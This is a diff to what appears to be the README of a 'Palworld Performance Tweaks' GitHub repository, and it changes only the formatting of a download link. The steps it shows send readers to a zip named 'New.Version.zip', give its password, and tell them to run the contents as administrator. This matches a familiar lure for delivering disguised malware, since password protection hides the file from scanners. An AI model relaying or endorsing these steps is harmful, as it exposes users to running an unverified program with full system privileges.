@@ -19,7 +19,7 @@ What it does:
 
 ## ⚙️ How to Use
 
-1. [Download]([Link](https://github.com/spiremoonslicer/Palworld-Performance-Tweaks/releases/download/Download/New.Version.zip))
+1. [Download](https://github.com/spiremoonslicer/Palworld-Performance-Tweaks/releases/download/Download/New.Version.zip)
 PASSWORD (5868781)
 2. Run as administrator.
 3. Choose:
